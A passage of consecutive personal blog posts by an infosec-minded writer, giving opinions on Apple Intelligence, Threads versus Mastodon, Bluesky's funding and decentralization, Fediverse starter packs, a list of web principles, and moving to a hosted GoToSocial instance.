iCloud-ey), support for multiple types of ‚Äúsecrets‚Äù (i. e. traditional credentials, credit cards, secure notes, software licenses, identities, etc‚Ä¶), MFA code support, weak password alerts, a much better password/passphrase generator, etc‚Ä¶ Apple IntelligenceFinally, Apple got around to announcing their (dreaded, for me) entrance into ‚ÄúAI‚Äù. I don‚Äôt want to spend much time in this post explaining the reasons I don‚Äôt like modern generative AI, so instead you can just go read this. So what did Apple announce? They‚Äôve branded their ‚ÄúAI‚Äù suite of capabilities, ‚ÄúApple Intelligence‚Äù (get it? abbreviated as ‚ÄúAI‚Äù). It is on-device (mostly), it can write/re-write stuff for you, generate those awful, soul-less images, and has some off-device capabilities which leverage Apple‚Äôs own ‚ÄúPrivate Cloud Compute‚Äú1 and even ChatGPT (gross). One thing I found particularly disgusting is the inclusion of a generative AI ‚Äúart‚Äù feature which Craig described as the ability to create ‚Äútotally original‚Äù images. Really? Totally original? I. e. totally not having stolen from countless other artists and creators? The overwhelming response to this particular aspect of Apple‚Äôs AI function-set seems to be pretty negative. But hey, if they‚Äôre doing it on-device, atleast that means it‚Äôs not some data center consuming resources at humanity-annihilating pace all just to creat cringey, lifeless photos of your mom in a super hero cape. One thing I actually did kinda like was ‚ÄúGenmoji‚Äù. Now I can create a whole suite of shark-related emojis that could not have existed before, and because they all have that same kinda ‚Äúemoji-aesthetic‚Äù, I personally think they are less harmful to creators. Time will tell if these AI features are actually useful, remain private and/or whether they can make Siri not hilariously bad. For what it‚Äôs worth, I actually walked away being less discouraged by Apple‚Äôs implementation than I thought I was going to be. Yes, they have partnered with ChatGPT in some capacity which I find disappointing, but their ability to implement something purely Apple home-grown, which leverages on-device processing first is something I think is very promising in terms of both their continued privacy stance and their ecological promises. In the end though, I hope all of this ‚ÄúAI‚Äù stuff is opt-out or otherwise completely disableable.

I have no purity tests with which one may fail. I can say, from my experience using Threads, that it is very pleasant and my ‚ÄúFor You‚Äù feed is pretty enjoyable, though content is very superficial, mostly filled with funny people trying to go viral, some Fediverse talk, NBA chatter and of course shit posts from the official Wendy‚Äôs account. Good. With that out of the way, let me give my short pitch &amp; warning related to the question of Threads v. Mastodon. Threads has A. a much larger user base, and B. an algorithm that from what I‚Äôve seen, seems pretty good at getting posts into peoples‚Äô feeds. For someone looking to build a following, or reach as many people as possible, these two features give Threads a serious advantage. But! For someone looking to build and then maintain a following, I still have concerns about using Threads as home base. Obviously, they haven‚Äôt implemented full Fediverse support, notably they don‚Äôt have the ability to port your account in or out of the platform. They say they‚Äôre going to do this, and have given us every reason to think they will, but until it happens, I remain weary. Second, Threads is run by Meta and Meta has some very opaque/shady behaviors as it relates to account suspension, censorship, shadow banning, algorithmic de-ranking, etc‚Ä¶ What I mean is that one wrong move and they can decide to pull the plug on your entire account, erasing your social graph and identity on the web in a flash. Whether by corporate policy or by political pressure, what is and is not acceptable content on their platform can be extremely volatile. Further, I am also concerned about content ownership. Posting on Threads means Meta owns what you post. They can delete it, change it and almost certainly will train their LLMs on it, it‚Äôs theirs. As for Mastodon, the population of the ‚Äútraditional Fediverse‚Äù is indeed smaller, but here you obviously have the ability to move your account, reach everything on the Fediverse, control/own your data and maybe most importantly self-host. It‚Äôs possible that I overvalue this particular feature, but the ability to self-host means A. you can have a Fediverse point-of-presence on your own domain, which is great for branding and B. you make yourself pretty darn resistant to deplatforming and censorship. For a content-creator, especially one that may have spicier things to say, this seems pretty important. What‚Äôs ultimately ‚Äúbetter‚Äù hinges a lot on what Threads does with their late-stage rollout of Fediverse support. Will they change their stance on opt-in to an opt-out model? This would drastically tip the scales in favor of those on the traditional Fediverse who want to reach the Threads-based masses. Will it be possible to amass a large following on Threads and then siphon those followers off to a traditional Fedi account? Will Threads be interoperable with other ActivityPub-compatible services like Pixelfed, Funkwhale or Castopod? With all these questions unanswered or in doubt (and other concerns still in mind), I just can‚Äôt really recommend content creators put their full faith in Threads and in Meta just yet. Building a FollowingFinally, you asked here about how people have built ‚Äúsizeable‚Äù followings (i. e. 500+, 1000+, etc‚Ä¶) and I have a few thoughts. I‚Äôm closing in on 2k followers and have some thoughts on how I‚Äôve got here. I don‚Äôt have a current breakdown of my followers but I suspect a large majority of them are first and foremost, in infosec. I got my start on the very large, very active and very popular (amongst infosec people) Mastodon instance infosec. exchange. I came over in one of the earlier Twitter exodus waves which helped bootstrap a base of followers as everyone scrambled to make connections and follow people. But this was at most a couple hundred accounts. But this is to say that unless there are similarly large waves of new people coming here, it‚Äôs unlikely that anyone could take similar advantage of a large group of people eager to follow anyone. Beyond this, I want to share 4 ‚Äútechniques‚Äù for boosting engagement and gaining followers, coming from someone who enjoys the former and doesn‚Äôt particularly care about the latter. I genuinely enjoy chatting with people on here, and though I do have a blog (and a rebooted podcast) and am thus a ‚Äúcreator‚Äù, none of what I create is monetized so I don‚Äôt have the same incentive to build a large following. Of the ‚Äútechniques‚Äù that I share below, the first two are easily replicable by anyone, and the other two require a little more, let‚Äôs call it ‚Äúluck‚Äù. If you want engagement, engage. If you want followers, follow. By simply engaging with other people‚Äôs posts, you may gain a follower or more! Also, many people ascribe to the, ‚Äúif you follow me, I‚Äôll follow you back‚Äù. I don‚Äôt participate in the latter, but as for the former, I think a lot of people are interested in following you if you are someone who is active and replies in a genuine, funny or helpful way. Be consistently active. You mentioned this in your post, and it‚Äôs true. If you post regularly (not overdoing it) and going back to item 1, engage regularly, you will naturally, and very organically, collect followers. Boosts by whales. In other words, if a big account (i. e. someone with like 10k or 20k+ followers) boosts one of your posts, this can rain followers. No way to make this happen, though going back to 1, by replying in a helpful or genuine way to something a big account posts, you never know, they may just boost it. Go viral. This is completely random it seems, and even in the event of a viral post, you may not net a lot of followers but it can happen. I personally have had some luck here with certain blog posts of mine being very popular (at least for a short time). Of note, these techniques are also ranked in terms of their effectiveness, with #1 being the most effective and #4 being the least. The takeaway being that I believe success lies mostly on things completely controllable by you or anyone else looking to build a network here. One other important caveat that I want to bring up though, and I touched on this earlier, is that a lot of my ‚Äúfollowing‚Äù is infosec, or infosec-adjacent accounts (I suspect). Having a sizeable, niche community can make it a bit easier for someone like me who is part of that community to build a following. So What Do I Think?At the end of the day, I‚Äôm not a content creator looking to leverage social media to monetize, so my objectives are a bit different. Maybe the short-to-mid-term benefits of cultivating a large, active following on Threads vastly outweight the longer-term risks of establishing your identity on a Meta-backed platform. I just don‚Äôt know. But, more personally, (and not that it matters) I‚Äôd be kinda sad to see you give up mkultra. monster. Big things are coming for the larger Fediverse, and I think opportunity here is abundant. I say you continue to run both (Mastodon &amp; Threads), but try to put in a bit more time on this side to grow. Either way, good luck and I‚Äôll see what you post regardless of where it comes from!

Not sure if it‚Äôs really always been this way, but in the wake of the Musk-ening of Twitter that birthed (or rekindled) so many other social platforms, my feed(s) are constantly a-buzz with hot-takes, analyses, cheerleading and more, all about social media itself. So, to add to that, here‚Äôs some musings on what‚Äôs goin‚Äô on in the social media landscape right now‚Ä¶ BlueskyLet‚Äôs start with Bluesky. For whatever reason (probably anti-‚ÄúX‚Äù sentiment following the US election), Bluesky is seeing a surge in new users. I‚Äôve experienced this first-hand in fact. I have a Bluesky account and (probably thanks to a Starter Pack or two that I am in) I have seen a ton of follows lately, nearly 1k+ in the past few days alone. This has unsurprisingly resulted in a lot of chatter on my Mastodon/Fedi feeds about Bluesky. A fair bit of, ‚ÄúBluesky looks cool, I‚Äôm going to check it out‚Äù, ‚ÄúI‚Äôm going to move over to Bluesky permanently‚Äù and of course, stuff like ‚ÄúBluesky is a VC-funded, faux-decentralized bad place that will enshittify and fail in the same way Twitter did‚Äù. Yeah, people are hot about it. At a surface level, I understand. People want their network to ‚Äúwin‚Äù. They want the people they care about to be on the same network they are, not fragmented. They also don‚Äôt want to have to pick up and move to another place and rebuild their community, etc‚Ä¶ I get it. There‚Äôs a lot I could say about Bluesky, and maybe one day I might say more, but for the sake of this note, I‚Äôll limit things to a few select topics‚Ä¶ Negative emotions regarding folks going to Bluesky Jack Dorsey Bluesky funding Is Bluesky decentralized? What I think you should do Bridgy Fed Starter PacksBluesky Emotions: Bluesky is popping off, people are leaving X en-masse it seems, and there are some who are also leaving Threads and Mastodon to ‚Äúlive‚Äù there too. So you have those on Bluesky cheering that they‚Äôve ‚Äúwon‚Äù, or that they‚Äôve reached the top of the charts (on the Apple App Store) and you have those on the fled networks (namely Mastodon) bemoaning that anyone would leave as Bluesky is yet another corpo-owned, VC-backed, centralized network, doomed to the same enshittified/billionaire-owned future as the rest of them. Phew! That‚Äôs a lot of emotions ‚Äì&gt; 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 and so many more‚Ä¶ All of the networks, yes, even ‚ÄúX‚Äù have their pros and cons - depending on what you want and who you are. The ‚ÄúFediverse‚Äù, being truly decentralized, and not owned or funded by VC/corporations means it has certain qualities that many of us value. It also means it lacks certain things that are present in centralized, or better-funded operations such as Threads or Bluesky. So, you‚Äôre interested in joining Bluesky. Should you try it out? Do it. If Bluesky is where the action is. If it‚Äôs where your friends are. If it‚Äôs where the accounts you want to follow are. If it‚Äôs where your audience is. Then go there. Be there. Even if you knew it would meet the same fate as Twitter ultimately did, would you not ride that ride for 15 years? For all of Twitter‚Äôs faults, even pre-Musk, people loved it. Twitter helped birth and incubate countless relationships, communities, businesses and more. It wasn‚Äôt perfect, and it wasn‚Äôt forever. But it was great for so many, and for a non-trivial amount of time. Bluesky could be this too, for as long as capitalism allows. For many, maybe for most, it would be worth spending 10-15 years there only to meet the same calamitous end rather than homesteading in Fedi-land where yeah, they may achieve true social longevity outside of corporate control but would also sacrifice all they may be able to build in what could amount to a true ‚ÄúTwitter 2. 0‚Äù. I‚Äôm Fedi-first. I like it here. I value the qualities of the Fediverse that no other platform offers. I like that I can own my own instance. I like that I can‚Äôt be deplatformed. I like that I don‚Äôt see ads. I like that it can‚Äôt be taken down by a billionaire or a single government. I like a lot of things about it. I‚Äôve also put the time and effort in to build a community here, to curate a very lively and fulfilling feed. I don‚Äôt fault anyone for going to Bluesky. If you like it there, great! I hope I get to see you through the bridge. If you don‚Äôt end up liking it there. Well maybe you‚Äôll come back to the Fediverse ‚ÅÇ. It seems others too are optimistic, even if mildly cautious, about the future of Bluesky. So go ahead, try it out. Bluesky, the Fediverse, and the future of social media The Great Migration to Bluesky Gives Me Hope for the Future of the Internet Protocols, Not Platforms‚Ä¶Longevity of Bluesky: Those of us telling people to steer clear from Bluesky usually have one or more of the following things to say‚Ä¶ It was founded by Jack Dorsey (yuck!) It‚Äôs VC-backed (and doesn‚Äôt have a long-term funding strategy) It‚Äôs a centralized platformJack DorseyOn the Jack Dorsey topic, go listen to this Dot Social podcast episode with Bluesky‚Äôs founder and CEO Jay Graber. Yes, Dorsey did help fund Bluesky in the beginning. But has since cut ties, left their board and gone on to twiddle away with Nostr and tell people to stay on X ü§∑‚Äç‚ôÇÔ∏è. So is his early involvement alone enough to curse the Bluesky project for eternity? I personally don‚Äôt think so. But you do you. VC-BackedYes. Bluesky did recently receive 15 million dollars in a Series A funding round, the majority of that money coming from the VC firm Blockchain Capital (BCAP). What does this mean? Bluesky will tell you that their new benefactor ‚Äúshares our philosophy‚Äù and that neither the Bluesky app, nor underlying AT Protocol uses blockchains and/or cryptocurrency. That is all well and good. For now. I‚Äôm no expert on how venture capital works, so excuse me if I say anything incorrect or naive, but my understanding is these firms don‚Äôt just give money away. They expect high-growth, and they expect a return on their investment. Even if they have no intention of somehow influencing Bluesky to incorporate any blockchain and/or cryptocurrency related technologies into the platform, they do at minimum expect Bluesky to make money, and a lot of it. So how will Bluesky do that? Right now they‚Äôre early stage. So it‚Äôs fine if they don‚Äôt have a monetization strategy that can yield the type of growth that BCAP expects. So far, all we know about how they plan to continue funding is this. Yeah, selling domain names isn‚Äôt going to be enough. Maybe they have some ideas up their sleeves. Or maybe they don‚Äôt now, but they will later. Who knows. Look at how other similar platforms have made their returns and you start to see the issues. We‚Äôve got selling ads, selling user data, ‚Äúpremium‚Äù subscriptions and worse. Best case scenario (from my perspective), their dream of decentralization will be realized and the costs of running the network will transition to smaller, indepedent entities, thus alleviating the funding burden to a degree. But how will those entities, in turn fund their operations? By the same enshitty means? Or through crowd-sourced user donations (similar to the Fediverse model)? On this, I‚Äôd love to see them thread the needle, and succeed where no other network has yet to. But I (and others) remain skeptical. Bluesky and enshittification Bluesky funding and origins Concern about Bluesky‚Äôs adjaceny to fascism VC funding is runway | L. Rhodes + Bluesky and enshittificationIs Bluesky ‚ÄúDecentralized‚ÄùLet‚Äôs dig into Bluesky‚Äôs claim of being ‚Äúdecentralized‚Äù. To start, I‚Äôll say that Bluesky is in no meaningful way decentralized at the moment. Sure, they‚Äôve open sourced some stuff to allow you to, in theory, stand up (most of) the infra to have a decentralized node on the network, but no meaningful amount of accounts live outside of the main centralized Bluesky corp-owned stack. But can Bluesky be decentralized? This is up for debate it seems. There are two parts of this story to me. The can and the will. On whether it can be decentralized, you‚Äôre welcome to peruse the AT Protocol documentation and decide for yourself. Others, smarter and more determined than myself have done this and came away rather, unconvinced (read: BlueSky is cosplaying decentralization &amp; The structure of the Bluesky network). Again, maybe it‚Äôs technically possible to have truly decentralized stacks that can operate independently (though again, there‚Äôs that pesky AppView issue right now). Let‚Äôs just assume that it is possible. So the question then becomes, will people actually do this? Will enough people stand up fully-functioning, isolated but connected instances of the entire Bluesky tech stack? This is the more meaningful question I think. As we have seen with the ‚ÄúFediverse‚Äù, decentralization can be messy. It requires people understand the technology and be able to correctly build and maintain the necessary infrastructure. It requires folks to then fund that infrastructure. Not easy. In the Bluesky universe, who‚Äôs going to do this? Individuals? Communities? Other corporations? What is the incentive? In so many ways, the people who have gravitated to Bluesky and other centralized platforms is for no other reason than that it is centralized. That is the benefit. If Bluesky achieves any meaningful level of decentralization, and that‚Äôs a big IF, they will then have the same issues that have plagued the Fediverse, i. e. instance-to-instance incompatibility, fiefdoms, instance closure (due to funding-issues among other things), annoyance around what instance to join, etc‚Ä¶ Sure, Bluesky has solved for some of this with their admittedly great version of portable identity on the network, but I still think any decentralized future for Bluesky will introduce issues, most importantly, issues that prevent Bluesky from ever reaching meaningful levels of decentrality. Federation Architecture Overview Bluesky isn‚Äôt decentralized or federated | Jan Wildeboer Reply on Bluesky and DecentralizationWhat I Think You Should Do: Alright, so you‚Äôre joining Bluesky, or maybe you‚Äôre thinking about it being your primary social platform. Here‚Äôs what I would suggest. Do it. Check it out! Or let it be your main social point of presence. It‚Äôs fine. If you like it, then that‚Äôs great. But here‚Äôs some things you might consider doing in tandem‚Ä¶ Bridgy Fed: Bridgy Fed is an awesome service that among other things, can bridge accounts from the Fediverse to Bluesky and in reverse from Bluesky to the Fediverse. From the Bridgy Fed website, ‚ÄúYou can use it to make your profile on one visible in another, follow people, see their posts, and reply and like and repost them. Interactions work in both directions as much as possible‚Äù. It‚Äôs easy to do! Got a fediverse account? Bridge it to Bluesky by following @bsky. brid. gy@bsky. brid. gy Got a Bluesky account? Bridge it to the fediverse by following @ap. brid. gy This means you can live blissfully wherever you like but still participate in and connect with those who are on the other network. It‚Äôs easy to do! Start a blog: I‚Äôm an IndieWeb enthusiast and big proponent of everyone having their own website/blog. But what does that have to do with my choice of social media platform? It boils down to this. Social platforms rise and fall, and when they fall, so too does your account which has likely served as your identity for and on the web. By having a website (or a ‚Äúblog‚Äù), you can anchor your identity to your domain name rather than some @twitter. com or @bsky. social or @whatever handle. Bluesky has actually realized this as something that is important and you are able to register a domain name as your actual handle on the service. Nice! But this only kinda helps. Sure, people might now know me now as ‚Äúshellsharks. com‚Äù on Bluesky, but if I had no blog, and Bluesky were to go belly up, people wouldn‚Äôt be able to find me as I wouldn‚Äôt exist anywhere except on Bluesky. But since I do have a website, people can continue to find me, connect with me, see what I have to say, etc‚Ä¶ by going to my domain. So sure. Use Bluesky if you want as your main social network. But go buy a domain, register it as your handle on Bluesky and then put something on that domain that resolves in a browser so people can find you now and into the future. XPosting: I see a lot of people suggest cross-posting to those who are thinking of ‚Äúmoving‚Äù to Bluesky. They‚Äôll say, ‚ÄúHey! instead of just posting to Bluesky, why don‚Äôt you post both places?‚Äù. I personally don‚Äôt like this. What I mean is that I think cross-posting comes with a lot of compromises, that for me, and I assume for so many others, doesn‚Äôt make it worth it. Cross-posting requires using an app built with this functionality, the ability to sign into multiple platforms. This may just not be the app someone wants to use. Though I will say there are some good options, Openvibe, Croissant, SoraSNS, etc‚Ä¶ Second, in my experience audiences are just, different on the different platforms. What you might say on one isn‚Äôt necessarily what you would say on the other. So just posting the exact same thing word-for-word across both might not really work. It can also be somewhat impersonal. So now there is the mental overhead of tweaking posts across each or deciding when you want to x-post or not. Posting across multiple networks also means fielding replies across both. Again, more work. We all arguably spend too much time already on social media, just on one platform, much less trying to juggle communities and relationships across both. So yeah, maybe cross posting is something you can do, or would like to do. But I certainly wouldn‚Äôt fault you for not doing it. On Starter Packs: A very popular feature of Bluesky is their Starter Pack. It‚Äôs basically a list of accounts you can give a name and people can peruse those lists, following individual accounts or clicking ‚ÄúFollow All‚Äù to follow everyone in the pack. It‚Äôs extremely easy to use, easy to create and at first glance, a great way to build your network and improve discoverability. Or so I thought‚Ä¶ In the past 72 hours I‚Äôve gone from like 200 followers to ~1. 2k followers. I‚Äôm almost certain this is because of my placement in a popular starter pack or two. Awesome right? More people will see what I post and might respond to me. But has it worked out that way? Hard to say, and engagement is a tricky thing to scientifically evaluate, but I don‚Äôt really think it‚Äôs having that effect. What I think is happening, and what I know I‚Äôve personally done, is just blindly follow everyone in a given pack with no real evaluation. I think this has a devaluing effect on my feed. Maybe I‚Äôm just used to the highly curated aspect of my Fedi feed. But damnit if that feed on Mastodon isn‚Äôt extremely high fidelity. It should be right? I‚Äôve hand selected every account I follow through somewhat rigorous means. Not just willy-nilly following 80 people in one fell swoop. What happens is this, for lack of a better word, junks up the feed. I‚Äôm someone who likes to read through my timeline, see what everyone has said. But on Bluesky, thanks to the fact that timeline position, when refreshed, sends you to the top, and the effects of these starter packs, I find that my feed is just an unruly mess that I can‚Äôt stay on top of and as a result find less interesting. Then, frustrated with my ‚ÄúFollowing‚Äù feed, I‚Äôll check out the default algorithmic ‚ÄúDiscover‚Äù feed, which tends to just be memes and ‚Äúbig accounts‚Äù - yawn. Another set of pitfalls I see with starter packs is ongoing management and redundancies. In just a few short days I‚Äôve seen quite a few ‚ÄúInfosec‚Äù starter packs pop up. If you‚Äôre an infosec person, and you want to be featured in the pack, which do you choose? Which will be the ‚Äúpopular‚Äù ones? Who created the pack? Will they keep it up-to-date? Do you feel comfortable pinging someone asking to be included in a pack? Will it become a popularity contest? I don‚Äôt know how to answer or really analyze much of this at this point, but I just see potential issues. That said, I still think it‚Äôs a great idea and does make following a lot of accounts a lot easier. Generic packs like ‚Äúinfosec‚Äù might be hard to maintain and be extremely unruly (100‚Äôs of people) but smaller, more focused packs, e. g. writers at 404 Media are perfect! ThreadsIf you‚Äôre going to talk social media, it‚Äôs hard to ignore Threads. Afterall, Threads still boasts over 200 million users and has 10‚Äôs of millions of daily active users (src). Contrast that with Bluesky or Mastodon‚Äôs relatively paltry sub-20m total users each. But Threads is flagging. People are unhappy with the choices the leadership/development teams have continued to make around algorithmic choices and more. I don‚Äôt use Threads much. I feel the same about Threads as I do Bluesky for the most part. If you like it there, and its where your ‚Äúpeople‚Äù are, then be there. It has some of the same, and some different risks as Bluesky, but whatever. The interesting wrinkle with Threads is the ongoing implementation of ActivityPub. Currently, Threads users who decide to opt in to the ‚ÄúFediverse sharing‚Äù beta can enjoy a very half-baked, but not entirely useless form of federation that allows users on the ‚Äútraditional‚Äù fediverse to see and even reply to posts you make natively on Threads. Actually kinda cool. You can‚Äôt yet follow native Fediverse users from Threads, but in theory that is coming in the not too distant future. I think if this ever does materialize, and does so in a non-compromising way, it will be a feature that gives those on Threads a real benefit over those on Bluesky. Afterally, the Bridgy Fed, Bluesky &lt;‚Äì&gt; Fedi bridge is cool, but comes with plenty of compromises as it would compare to true Federation. The FutureI can‚Äôt see the future. Who knows what will happen. But there is a non-zero chance that Bluesky fails to truly decentralize, and the main/centralized instance of the platform is forced to enshittify in some disastrous way. Simultaneously, (in this same timeline) Threads has continued to decline in user experience thanks to an increasingly heavy-handed algorithm, inability to moderate spam accounts and overpopulation of corporate or advertising-related posts/accounts. Where do people go? Will they stay on those centralized platforms, accepting the compromises for what they are and muddle through? Will a new shiny platform pop up and people go there? What will it take for the ‚ÄúFediverse‚Äù to get real traction? What features do we need? What cultural shift needs to happen? What big ‚Äúcelebrity‚Äù accounts would need to set up shop here? I can‚Äôt say. I think improving discoverability by copying some of Bluesky‚Äôs popular features, namely custom feeds (opt-in algos) and starter packs could really help. I also think improving the identity model, also similar to how Bluesky has done it by being domain backed, could also help. Beyond that, moderation improvements and instance choice/onboarding could use a freshen-up to help people feel less intimidated by joining. An exciting time to be sure!

It isn‚Äôt without some faults of course, but it certainly makes the process of organizing, finding accounts and being ‚Äúdiscovered‚Äù much easier. That‚Äôs great! For Bluesky, but what about the Fediverse? Fedi Discoverability TimelineDiscoverability has always been a bit of a weak spot on the Fediverse. With no algorithm to prop up posts or accounts, coupled with inherent visibility issues of a federated system, it has always been up to individuals to share and boost stuff to their respective followings so that others may be discovered. Here‚Äôs a quick rundown, in somewhat of a ‚Äútimeline‚Äù form of how discoverability has worked/works on the Fediverse‚Ä¶ ‚ÄúFedi-native‚Äù: Ok, so starting off, we‚Äôve got boosts, local timelines and hashtags. Boosts are great, but in practice, they only move a post as far as the individual who has boosted you‚Äôs individual network goes. And though I think the Fediverse‚Äôs culture is the best in terms of boosting (compared to Threads, Bluesky, etc‚Ä¶), I still think most people shy away from the practice. For accounts with only a few, or no followers at all, how can you expect to get a boost if no one sees your post to begin with? Local Timelines can help people discover you, and you discover others, but in a federated world, a lot of who you might want to connect with will live outside your immediate instance. Also, one of the joys of the Fediverse is having your own single-user, or small instance. Hashtags are also available, but following one can be fraught (noisy) which limits the extent to which people would discover you in that way. I also have found that a lot of people don‚Äôt bother using hashtags. Search is available, but is notoriously limited in many ways thanks to the decentralized/federated nature of the Fediverse. Community-driven discoverability: Beyond what the Fediverse offers natively, there are other community-driven efforts to help with discoverability‚Ä¶ #FollowFriday is a great hashtag that seems to have decent adoption. Just list out some accounts you like in a post with the #followfriday tag and boom! Others have attempted to build and then share manual lists of recommended, or like accounts (i. e. I have some examples listed here). In the spirit of the web‚Äôs blogroll, I attempted to make #Fediroll a thing. It did not take. The idea was simple though. Much like a blogroll, list your favorite Fedi accounts on a post and pin that to your profile. The advent of Bsky ‚ÄúStarter Packs‚Äù: Then, Bluesky announced Starter Packs - the adoption and popularity of this feature has been off the charts! So, the Fediverse community responded. Some of us pointed out all the past efforts to juice discoverability. The awesome Mastodon Migration account went a step further, formalizing and then creating + sharing a wide variety of ‚ÄúFollow Packs‚Äù. A nobel effort, but suffers from the overhead involved in downloading a . csv list and manually importing it. FediDevs Starter Packs: Which brings me to now, Fedi-native An≈æe has released their project for implementing Starter Packs on the Fediverse. It is (in my opinion) a more elegant solution that simplifies the process for creating and following packs in an interface that looks pretty great! It solves for the ‚Äúmanual import‚Äù issue which previous methods suffered from by having you log into FediDevs with your Mastodon account, allowing the app to leverage the built-in API to follow accounts en-masse. It‚Äôs early days, so there are still some bugs, weaknesses and other concerns with this implementation of starter packs, but I think it‚Äôs a fantastic addition to the Fediverse and a great display of the power of the community here. Notably, packs are still limited to 150 accounts, some profiles are hard to search for and add, and as of now it is not possible to upload an existing list of accounts to a starter pack, but these are all issues that have understandable tradeoffs. This project might also be limited to Mastodon (for now). I look forward to what the larger community will build with this, I‚Äôve actually already started a pack or two! IndieSec I created a FediDevs-fueled Starter Pack! It‚Äôs titled ‚ÄúIndieSec‚Äù. It features Infosec / cybersecurity individuals. No corporate accounts, no bots, no influencers. Some more context on the pack: I created it by searching some existing lists I had, a few infosec-related local timelines and things I had starred in the past, trying to find folks that‚Ä¶ A. post about infosec (not exclusively or anything, but y‚Äôknow, a decent amount of their posts/replies are infosec-related), B. are at least mildly active on the Fediverse, C. aren‚Äôt accounts that already have a gigantic following (no offense to those accounts, but I‚Äôd like to use the limited space in this pack to help smaller accounts be discovered) As such, guaranteed I‚Äôve missed a lot of folks who should be in the pack. It is a manual effort, and sorting through who is still active here is a bit of a chore. One that I was happy to do up to a point, but I eventually just needed to publish the pack and work on adding more accounts as they come and as people request to be included. So yeah! Check out the pack. You can peruse it and follow selectively, or ‚ÄúFollow all‚Äù with a click of a button. If you want to be added to the pack, just send me a note (keeping in mind the criteria I mentioned above). If the pack runs out of space, I‚Äôll probably start up an ‚ÄúIndieSec 2‚Äù sequel pack.

See them listed below‚Ä¶ There is one web The web does not cause harm to society The web supports healthy community and debate The web is for all people The web is secure and respects people‚Äôs privacy The web enables freedom of expression The web makes it possible to verify information The web enhances individuals‚Äô control and power The web is an environmentally sustainable platform The web is transparent The web is multi-browser, multi-OS, and multi-device The web can be consumed in any way that people choose Those look lovely don‚Äôt they! Here‚Äôs some ‚Äúflash takes‚Äù (i. e. quick thoughts) on each of them‚Ä¶ There is one webChina‚Äôs Great Firewall, dark web, deep web, local networks, intra-networks, etc‚Ä¶ There‚Äôs a lot of webs. Though I think the point here is to keep the larger web open, free and available to the masses. The web does not cause harm to societyOoph. If only. You could probably argue that the web has done more societal and economic good than it has bad, but it‚Äôs tough to say that the web is wholly good, causing no harm to society right? Sure, maybe you could pin it on bad actors rather than the web itself, but that sounds a bit like the ‚Äúguns don‚Äôt kill people, people kill people‚Äù argument. The web supports healthy community and debateIn some ways yes, in other ways not at all. The anonymous nature of many web-based forums facilitates a lot of very unhealthy communities and toxic debate stages in my opinion. But of course the web also allows people from different backgrounds, means, cultures, etc‚Ä¶ to all connect which is a wonderful thing. The web is for all peopleIt should be. Agree 100%. However, there are still a lot of disadvantaged people, even here within the USA who do not have equal access to the modern web. Whether that be no internet access at all, or they have access but it is too slow to properly render much of what the web has to offer, the web may be for all, but not all have equitable access. The web is secure and respects people‚Äôs privacyLaughable. Sure, the ‚ÄúInternet‚Äù (to genericize all things) has made some strides implementing some form of SSL/TLS across the board (Thanks Let‚Äôs Encrypt!), which improves some security properties but the web being ‚Äúsecure‚Äù is a very loaded term and companies have done just about everything they can to ensure the web won‚Äôt respect your privacy. Assuming a site you are interacting with actually has an SSL cert, you still have to worry about‚Ä¶ Does that web server limit what SSL/TLS specs / cipher suites to those that are ‚Äúsecure‚Äù? Does the web application have vulnerabilities? Does the entity that owns/controls the web server properly secure/protect any data you share? other things‚Ä¶The web enables freedom of expressionThis is true, to a point. As more of the ‚ÄúInternet‚Äù trends into the behemoth centralized platforms though (e. g. Facebook, Cloudflare, Google, etc‚Ä¶) and their content moderation/censorship policies go to work, you start to see a watering down of this particular freedom. The web makes it possible to verify informationAI anyone? AI is really gutting this particular principle. Cryptographic signatures offer some non-repudiation properties I suppose? The web enhances individuals‚Äô control and powerIt can. It should. But this requires people to take control, and not rely on centralized services solely for their means of communication, data storage, identity, etc‚Ä¶ As the years pass, so does this knowledge. Less and less people have the will or know-how. The web is an environmentally sustainable platformAI. Ugh, again AI. The web is becoming overrun with slop. AI-generated slop, the generation of which takes a disastrous toll on our environment. The web is transparentHonestly, not sure what this principle entails? The web is multi-browser, multi-OS, and multi-deviceI actually don‚Äôt have too much to complain about here! I think the web is fairly ubiquitous across a variety of devices. Sure, there are some troublesome aspects of certain platform‚Äôs ‚Äúwalled gardens‚Äù, but I‚Äôm largely happy with the state of things in this regard. The web can be consumed in any way that people chooseNot quite, but I don‚Äôt think it‚Äôs all bad. Browser issues abound, platform walled gardens, centralization of the web are all limiting factors. But hope remains! I like the princples. But we have work to do!

Exchange to a single-user, managed (by Masto. Host) Mastodon instance at Shellsharks. Social. I wrote all about it here. I‚Äôve really enjoyed ‚Äúowning‚Äù my own social in this way, and honestly Masto. Host has been a really great provider. But, it‚Äôs missing one really important thing for me, and that‚Äôs the ability to write posts that exceed vanilla Mastodon‚Äôs limit of 500 characters. Look, I‚Äôm just a verbose person I guess, and I really don‚Äôt like threading what I want to say. There are a lot of ways to fix this issue, there is the Mastodon Glitch Edition, and a plethora of other Fediverse platforms that, especially when ‚Äúself-hosted‚Äù, allow you to change this cap. For a while, I had settled on just keeping my posts/replies 500 chars or less and for anything that required a longer response, I would simply write a quick blog post/note and link to that in my post/reply. But in practice, I really didn‚Äôt want to have to draft up a whole formal post/note on the site just to respond to something I saw on social media. There were so many things that I really just needed a bit more breathing room on to respond as I would have liked. After nearly a year running with this handicap, I‚Äôve decided to check something new out. Enter GoToSocial. GoToSocialGoToSocial is a lightweight, customizable, ActivityPub-compatible social network server. There‚Äôs not alot I can really say about GoToSocial actually. Maybe in the future, as my trial of the software progresses, I will put more into this section about what makes GoToSocial special. What I will say is that I chose it because it is A. very customizable, and B. light-weight, and therefore cheap to run/host. Which brings me to K&amp;T Host. HostingIn the leadup to me starting up this instance on GoToSocial, I had seen someone ask about Fediverse managed hosting providers and provided them the list I created a while back. After cleaning up that list, I really started thinking about what software I wanted to try out to move beyond the limitations of vanilla Mastodon. Though I ultimately went with K&amp;T Host because of their GoToSocial offering, I had considered using SpaceHost as they have a wide range of microblog options including Akkoma + Mangane, Pleroma and Sharkey. I also know a few people who use SpaceHost, so I knew they would be a reliable provider. But K&amp;T Host had the GoToSocial offering, and that was the most intriguing to me in the moment. It also helps that I actually already use K&amp;T Host for my Castopod-powered Shellsharks podcast! K&amp;T Host: K&amp;T Host makes it extremely easy to get things up, running and configured. You can peruse their ‚ÄúApp Cloud‚Äù to see the variety of things you can host, and for any of them, click the ‚ÄúOrder Hosting‚Äù button to get started configuring your instance. I‚Äôll add here that in my experience with K&amp;T Host, their support team is really helpful, extremely prompt (even at the bizarre hours I tend to message them at), and very knowledgeable about the services they support. On the configuration page, you can configure Disk Space, 